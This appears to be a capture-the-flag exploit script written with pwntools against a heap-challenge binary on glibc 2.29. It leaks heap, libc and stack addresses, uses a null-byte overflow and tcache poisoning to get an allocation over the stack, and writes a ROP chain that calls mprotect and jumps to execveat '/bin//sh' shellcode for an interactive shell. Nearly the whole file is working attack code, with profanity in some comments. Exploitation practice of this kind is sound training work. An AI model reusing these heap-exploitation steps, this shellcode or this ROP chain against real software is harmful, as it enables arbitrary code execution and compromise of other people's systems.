from pwn import *
import os

from struct import pack

os.system('pwd')

r = None

def add(size, content=''):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size: ', str(int(size)))
    r.sendlineafter('data: ', content)

def edit(index, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter('index: ', str(index))
    r.sendlineafter('Input data: ', content)

def delete(index):
    r.sendlineafter('> ', '3')
    r.sendlineafter('index: ', str(index))

def read(index):
    r.sendlineafter('> ', '4')
    r.sendlineafter('index: ', str(index))
    

#target = ELF('./dd3')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6')

r = process('./dd3-2.29')
# r = process(['./ld-2.29.so', '--library-path', './', './dd3'])

# gdb.attach(r, gdbscript='c')

# print(hex(libc.symbols['environ']))

# raw_input()

#add(0xf8, 'A'*8)
#raw_input('bk1')
#add(0x128, 'B'*8)
#raw_input('bk1')
#edit(0, 'C'*0xf8)
#raw_input('bk2')

# 0x118 -> 0x120
# 0x128 -> 0x130
# 0xf0  -> 0x100

# fill the tcache

for x in range(7):
    add(0xf0)
for x in range(7):
    delete(x)

for x in range(7):
    add(0x128)
for x in range(7):
    delete(x)

# get tcache chunk size=0x130
add(0x128, 'A'*0x128) # 0
add(0x118, 'B'*0x118) # 1

# chunk_size-fake_chunk_size-fake_chunk_header ; header ; p64(0) to avoid 0a
# the fake chunk is used to bypass the next_chunk check of coalesing
add(0x118, 'C'*(0x120-0x20-0x08) + p64(0x21) + p64(0)*3) # 2

# free chunk 0 to put tcache->next inside chunk
delete(0)

# request previous freed chunk
add(0x128)

# leak tcache heap addr
read(0)

r.recvuntil(': ')
leaked_tcache_addr = u64(r.recvn(6).ljust(0x8, '\x00'))
log.success('tcache leaked addr: ' + hex(leaked_tcache_addr))

heap_base = leaked_tcache_addr-0x230a
log.success('Heap base: ' + hex(heap_base))

# gdb.attach(r)

# subtract 0x40 in order to work in remote
chunk0_addr_offset = 0x1d6#-0x40

# in order to work in remote, need to sub 0x10 from heap
chunk0_addr = leaked_tcache_addr+chunk0_addr_offset-0x10 # chunk0 addr

delete(0)

# create a fake chunk inside chunk0 to forge a bigger chunk size
# size = 0x241 because 0x10 bytes of chunk0 (0x130) will be used to write fake header, so its new size is 0x120, then
# chunk0_size+chunk1_size (which is also 0x120) = 0x240; + 0x01 (prev in use) = 0x241
add(0x128, p64(0) + p64(0x241) + p64(chunk0_addr)*2)

# overflow a null byte into C chunk size
# also, we can't send null bytes in edit, so we need to use the null byte append to clear the old data (0x42)
edit(1, 'E'*(0x110) + 'B'*8)
edit(1, 'E'*(0x110) + 'B'*7)
edit(1, 'E'*(0x110) + 'B'*6)
edit(1, 'E'*(0x110) + 'B'*5)
edit(1, 'E'*(0x110) + 'B'*4)
edit(1, 'E'*(0x110) + 'B'*3)
edit(1, 'E'*(0x110) + '\x40\x02')


log.info('Triggering coalesing...')
# trigger coalesing
delete(2)

# gdb.attach(r)

# requesting chunk 0 to leak libc
# this will be a part of the coalesed chunk
add(0x110) # size = 110 so it will request from unsorted bin chunk | 

read(1)

r.recvuntil(': ')
main_arena_p96 = u64(r.recvn(6).ljust(8, '\x00'))
log.success('<main_arena+96> addr: ' + hex(main_arena_p96))
# log.success('main_arena+96 offset = ' + hex(libc.symbols['main_arena']))

libc_base = main_arena_p96 - 0x1E4CA0
log.success('libc base addr: ' + hex(libc_base))

# malloc_hook = libc_base + libc.sym['__malloc_hook']
# log.success('__malloc_hook addr: ' + hex(malloc_hook))

# raw_input('1')

delete(0)

# raw_input('<g>')

log.info('clearing tcache to get the unsorted chunk')
# clear tcache to get the unsorted chunk
for i in range(7):
    add(0x128)

add(0x128, 'F'*8) # getting another part of coalesed chunk, where chunk1 originally was

# raw_input()

# delete last 2 allocated chunks
delete(8)
delete(9)

log.info('putting the environ address on chunk1->next')
log.info('and adding 0x01 because \\n in the final of string fucked me..')
# putting the environ address on chunk1->next
# need to add 0x01 because \n in the final of string fucked me
libc_environ = (libc_base + libc.symbols['environ'])-0x01

log.success('libc environ addr+0x01: ' + hex(libc_environ))


edit(1, 'B'*6 + p64(libc_environ)[:6])
edit(1, 'B'*5 + p64(libc_environ)[:6])
edit(1, 'B'*4 + p64(libc_environ)[:6])
edit(1, 'B'*3 + p64(libc_environ)[:6])
edit(1, 'B'*2 + p64(libc_environ)[:6])
edit(1, 'B'*1 + p64(libc_environ)[:6])
edit(1, 'B'*0 + p64(libc_environ)[:6])
# edit(1, p64(libc_environ)[:6])
# edit(1, 'B'*1 + p64(libc_environ)[:6])
# edit(1, p64(libc_environ)[:6])

# print()
add(0x128, 'A'*8)

add(0x128) # get the environ pointer

#print('opora')
# raw_input()

read(9)
r.recvuntil(': ')
data = r.recvn(7)[1:] # getting the fucking right addrs now bitch
stack_leak_addr = u64(data.ljust(8, '\x00'))
# print(repr(data))
log.success('Stack addr leaked: ' + hex(stack_leak_addr))

# fuck

# ...

# now execveat rop oh boi

# rop_addr = stack_leak_addr-0xf2
#
#
rop_addr = stack_leak_addr-0xf0
log.info('rop_addr: ' + hex(rop_addr))

log.info('starting rop chain')
# gdb.attach(r, gdbscript="c")

delete(7)
delete(8)

edit(1, 'B'*6 + p64(rop_addr)[:6])
edit(1, 'B'*5 + p64(rop_addr)[:6])
edit(1, 'B'*4 + p64(rop_addr)[:6])
edit(1, 'B'*3 + p64(rop_addr)[:6])
edit(1, 'B'*2 + p64(rop_addr)[:6])
edit(1, 'B'*1 + p64(rop_addr)[:6])
edit(1, 'B'*0 + p64(rop_addr)[:6])

# raw_input('<2>')

# 0x00000000000271ca: pop r14; pop r15; pop rbp; ret;                                                                                                                          

pop_rax_ret = 0x000000000003ee58
push_rax_ret = 0x000000000003acf3
pop_rbx_pop_r12_ret = 0x0000000000050fd7
pop_rdi_ret = 0x000000000002679e
push_rdi_ret = 0x0000000000165c7e
push_rsp_ret = 0x000000000003af99
pop_rsi_ret = 0x000000000003af9f
syscall_ret = 0x000000000005809a
push_rbx_ret = 0x00000000000f2099

# payload = '\x90'
# payload = p64(rop_addr+0x08) # ret addr
print('-> ' + hex(libc_base+push_rax_ret))

# payload = p64(libc_base+0x00000000000271ca) # first ret addr appends a 'ca' in addr idk why
# payload += p64(0x0)
# payload += p64(0x0)
# payload += p64(libc_base+push_rbx_ret)
# payload += p64(libc_base+pop_rax_ret)
# payload += p64(0x142)
# payload += p64(libc_base+pop_rdi_ret)
# # payload += p64(0x0)
# payload += b'//bin/sh'
# payload += p64(libc_base+push_rdi_ret)
# payload += p64(libc_base+push_rsp_ret)
# payload += p64(libc_base+pop_rsi_ret)
# payload += p64(libc_base+syscall_ret)

'''
rax -> 0x142
rdi -> /bin//sh
rsi -> ptr->/bin//sh
rdx -> 0x0
r10 -> 0x0
r8  -> 0x0

    mov rax, 0x142
    push rdx
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rsi
    syscall

'''

p = lambda x : pack('Q', x)

#shellcode = '\xcc'*100
shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
shellcode_addr = leaked_tcache_addr+0x1d6

IMAGE_BASE_0 = libc_base # 705735f00b8523a7e976113bd87d6ed7f1a46e03bac45f4e42ffeb60dc51f888
rebase_0 = lambda x : p(x + IMAGE_BASE_0)


rop = ''
rop += rebase_0(0x000000000002679e) # 0x000000000002679e: pop rdi; ret; 
rop += p(heap_base)
rop += rebase_0(0x0000000000027079) # 0x0000000000027079: pop rsi; ret; 
rop += p(0x329a)
rop += rebase_0(0x00000000000cb18d) # 0x00000000000cb18d: pop rdx; ret; 
rop += p(0x0000000000000007)
rop += rebase_0(0x000000000003ee58) # 0x000000000003ee58: pop rax; ret; 
rop += p(0x000000000000000a)
rop += rebase_0(0x000000000005809a) # 0x000000000005809a: syscall; ret; 
rop += p64(shellcode_addr) #rebase_0(0x0000000000027e3e) # 0x0000000000027e3e: call rsp; 
rop += 'B'*8

# shellcode_addr = leaked_tcache_addr+0x1d6

gdb.attach(r, gdbscript='''c''')

edit(0, shellcode)

log.info('Sending payload...')
add(0x128, 'A'*8)
add(0x128, rop) # allocated on rop_addr

# r.sendline('5')

log.success('PWNED!')
# r.recv()
r.interactive()
